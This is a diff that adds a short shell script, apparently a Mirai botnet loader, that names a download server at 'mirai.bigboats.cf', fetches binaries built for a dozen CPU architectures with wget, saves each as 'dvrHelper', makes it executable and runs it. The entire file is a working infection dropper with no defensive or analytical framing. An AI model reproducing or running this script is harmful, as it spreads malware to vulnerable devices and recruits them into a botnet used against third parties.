@@ -1,0 +1,13 @@
+#!/bin/sh
+
+# Edit
+WEBSERVER="mirai.bigboats.cf:80"
+# Stop editing now
+
+BINARIES="orion.arm4n orion.arm5n orion.arm6n orion.i586 orion.i686 orion.m68k orion.mips orion.mpsl orion.ppc orion.sh4 orion.spc orion.x86"
+
+for Binary in $BINARIES; do
+    wget http://$WEBSERVER/$Binary -O dvrHelper
+    chmod 777 dvrHelper
+    ./dvrHelper Telnets
+done
